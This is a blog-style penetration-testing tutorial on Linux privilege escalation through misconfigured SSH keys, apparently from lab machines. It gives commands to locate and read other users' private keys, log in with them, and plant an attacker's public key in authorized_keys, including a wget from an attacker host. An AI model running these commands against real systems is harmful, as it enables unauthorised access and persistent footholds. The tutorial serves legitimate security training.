---
title: "Misconfigured SSH Keys"
author: am-a-circle
date: 2021-12-31 09:00:00 +0800
categories: [privilege escalation]
tags: [SSH]
math: false
mermaid: false
---

Extract from [here](https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/) !

## **Understanding Asymmetric Encryption**

Before diving into the possible attacks, it is crucial to understand the key pair concept that SSH and other asymmetric cryptographic protocols utilize to secure a connection. These use a private key to encrypt information, and a corresponding public key to decrypt it.

When communicating to a machine via SSH, a user can authenticate if their private key is considered trustworthy by the server and added to the [authorized_keys](https://www.ssh.com/ssh/authorized_keys/) file, or if their private key corresponds to a public key stored in the server.

The default name for public keys is usually id_rsa.pub or id_dsa.pub and the default name for private keys is id_rsa or id_dsa, based on the encryption algorithm used. DSA is known to be insecure.

## **Exploiting SSH Keys**

The main two ways of exploiting SSH keys are the following:

-   Accessing readable private SSH keys and using them to authenticate
-   Accessing writable public SSH keys and adding your own one to them to authenticate

If readable private keys or writable public keys are present on the machine, this could allow for an attacker to escalate privileges to root.

Public and private keys are generally stored in one of the following locations:

-   /root/.ssh/
-   /home/user_name/.ssh/ (users home directory)
-   /etc/ssh/
-   in the paths specified in the ssh_config or sshd_config config files

The following command can be used to identify any existing public or private keys and their permissions:

```
ls -la /home /root /etc/ssh /home/*/.ssh/; locate id_rsa; locate id_dsa; find / -name id_rsa 2> /dev/null; find / -name id_dsa 2> /dev/null; find / -name authorized_keys 2> /dev/null; cat /home/*/.ssh/id_rsa; cat /home/*/.ssh/id_dsa
```

### **Readable Private Keys**

As mentioned earlier, private keys are used by users to authenticate via SSH. If a private key is stored in a way that makes it accessible to the current user, this means it can be used to perform an authentication as the owner of the private key.

The easiest way to exploit this is to simply copy the key over to a Kali host, by simply copying and pasting the contents of the file. 

In order for the private key to be accepted by SSH, it needs to be only readable and writable only by its owner, otherwise it will complain that the permissions applied are too open.

Using the following command to change the file permissions against the newly created SSH private key:

```
chmod 600 id_rsa
```

The following command can then be used to login as the “Victim” user:

```
ssh -i id_rsa user_name@X.X.X.X
```

#### Get username of private keys

If you have private key but not sure of the username. The below will  read a private OpenSSH format file and print an OpenSSH public key to stdout.

```bash
┌──(root💀kali)-[/opt/hackmyv/icarus]
└─# ssh-keygen -y -f id_rsa

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnFqDEuI3k5uE+M1yzYjZyRxisSspq6c7CbjSRMGcnq+tt1Fge15Jp81YLrEUXPA7vv4rN7bb14rh11lzCZTQh03TZjydivGGXyU5z57lPQCPP61GYsajElU+xJPMoERGVakq4mgY78IQUs6/o8/qzv1hjNkWl1SNpzNj3qOAgJ+3M1lL5WQFe4uMqvv2HhPDPsErhXoURBjSHBPw0V82sXfHdU97RSy12JQkWXhBX+oA+UdWE93RhQQ+v/3mavKO4aLXHA/vFUWtjKMt896mpgeJLktnEV7AtaGFKME4jR3N/9PCI1GdUZNmEHcZ6aAQhBEBqbbqORlncHGStRVyR icarus@icarus
```

### **Writable Public Keys**

The authorized_keys file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured.

The default configuration in most SSH implementations allows users to deploy new [authorized keys](https://www.ssh.com/ssh/authorized-key) for themselves and anyone else, which are permanent and may bypass privileged access management systems.

If the authorized_keys file is writable to the current user, this can be exploited by adding additional authorized keys.

The easiest way to exploit this is to generate a new SSH key pair, add the public key to the file and login in using the private key.

The ssh-keygen command line utility can be used to generate a new SSH key pair.

The public key can then be copied with the ssh-copy command line tool:

```
ssh-copy-id user_name@X.X.X.X
```

Or simply by using cat to output the contents of the id_rsa.pub file and redirect it to the authorized_keys file:

```
cat ~/.ssh/id_rsa.pub | ssh user_name@X.X.X.X "cat >> /home/user_name/.ssh/authorized_keys"
```

The methods above will only work if SSH access is already available. If not, the contents of the public key can simply be pasted into the authorized_host file. Using xclip to add the public key to the clipboard or Copying the public key to the authorized_hosts file.

e.g.

```bash
www-data@five:/tmp$ ssh-keygen                                                                                                                                            
Generating public/private rsa key pair.                                                                                                                                   
Enter file in which to save the key (/var/www/.ssh/id_rsa): /tmp/id_rsa                                                                                                   
Enter passphrase (empty for no passphrase):                                                                                                                               
Enter same passphrase again:                                                                                                                                              
Your identification has been saved in /tmp/id_rsa.                                                                                                                        
Your public key has been saved in /tmp/id_rsa.pub.                                                                                                                        
The key fingerprint is:                                                                                                                                                   
SHA256:AqFOY+gJJbcHcANOjAprNc9ANyZT3hCD/n/gLJEPU6s www-data@five
The key's randomart image is:
+---[RSA 2048]----+
|*+B++O.          |
|=B X*.=          |
|=oO B. .         |
|==.+ + .         |
|.o. . + S        |
|     * +         |
|      X .        |
|     E = .       |
|      . .        |
+----[SHA256]-----+

www-data@five:/tmp$ ls    
id_rsa  id_rsa.pub  systemd-private-c92ecfd176894a7d8dabf029f877607c-systemd-timesyncd.service-c1CO3M


www-data@five:/tmp$ sudo -u melisa cp id_rsa.pub /home/melisa/.ssh/authorized_keys
```

Alternatively , instead of creating keys using SSH keygen , port over your id_rsa.pub and ssh through your local machine.

On victim Machine:
```bash
www-data@five:/tmp wget http://192.168.56.3:1235/id_rsa.pub

www-data@five:/tmp$ sudo -u melisa cp id_rsa.pub /home/melisa/.ssh/authorized_keys
```
On Local Machine:
```bash
┌──(root💀kali)-[/opt/hackmyv/five]
└─# ssh melisa@192.168.56.27 -i /root/.ssh/id_rsa
```
